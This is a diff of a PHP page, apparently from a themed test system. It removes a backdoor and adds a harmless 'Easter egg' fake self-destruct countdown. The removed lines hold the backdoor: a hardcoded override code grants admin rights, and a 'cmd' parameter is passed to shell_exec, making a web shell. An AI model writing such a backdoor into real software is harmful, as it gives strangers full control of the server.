@@ -1,15 +1,54 @@
 <?php
-// Naval Command Override Panel
-if ($_GET['override'] == 'HIVE_OVERRIDE_2023') {
-    $_SESSION['admin'] = true;
-    echo "<p>Emergency access granted. Welcome, Admiral.</p>";
-    
-    // Execute arbitrary commands (for "system maintenance")
-    if ($_GET['cmd']) {
-        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Easter egg - self-destruct sequence
+    if ($_POST['code'] === '000-DESTRUCT-0') {
+        echo "<pre>";
+        echo "SELF DESTRUCT SEQUENCE INITIATED\n";
+        for ($i=10; $i>0; $i--) {
+            echo "$i...\n";
+            sleep(1);
+        }
+        echo "Just kidding! This is a test system.\n";
+        echo "But you found the Easter egg!\n";
+        echo "</pre>";
+        exit();
     }
-} else {
-    header("HTTP/1.1 401 Unauthorized");
-    die("Invalid override code");
 }
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Emergency Access</title>
+    <style>
+        body { 
+            background: #000; 
+            color: red; 
+            font-family: monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        input {
+            padding: 10px;
+            font-size: 20px;
+            background: #111;
+            color: red;
+            border: 1px solid red;
+        }
+        button {
+            padding: 10px 20px;
+            background: red;
+            color: black;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>EMERGENCY ACCESS PORTAL</h1>
+    <p>Enter destruct code:</p>
+    <form method="POST">
+        <input type="password" name="code" placeholder="DESTRUCT CODE">
+        <button type="submit">ACTIVATE</button>
+    </form>
+</body>
+</html>
